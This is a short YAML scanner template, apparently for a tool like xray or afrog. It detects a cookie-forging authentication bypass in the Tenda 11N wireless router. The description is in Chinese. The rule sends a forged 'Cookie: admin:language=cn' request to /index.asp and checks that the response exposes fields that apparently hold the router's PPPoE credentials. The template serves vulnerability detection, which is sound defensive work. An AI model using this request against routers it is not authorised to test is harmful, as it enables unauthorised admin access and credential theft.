expression: r0()
id: tenda-11n-cookie-unauth-access
info:
  author: zan8in
  description: "Tenda 11N\u65E0\u7EBF\u8DEF\u7531\u5668\u7531\u4E8E\u53EA\u9A8C\u8BC1\
    Cookie\uFF0C\u5BFC\u81F4\u4EFB\u610F\u7528\u6237\u4F2A\u9020Cookie\u5373\u53EF\
    \u8FDB\u5165\u540E\u53F0\napp=\"TENDA-11N\u65E0\u7EBF\u8DEF\u7531\u5668\"\n"
  name: "Tenda 11N\u65E0\u7EBF\u8DEF\u7531\u5668 Cookie \u8D8A\u6743\u8BBF\u95EE\u6F0F\
    \u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/Tenda/Tenda%2011N%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%20Cookie%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'<title>TENDA')
      && response.body.bcontains(b'def_PUN') && response.body.bcontains(b'def_PPW')
      && response.body.bcontains(b'def_WANT')
    request:
      headers:
        Cookie: admin:language=cn
      method: GET
      path: /index.asp
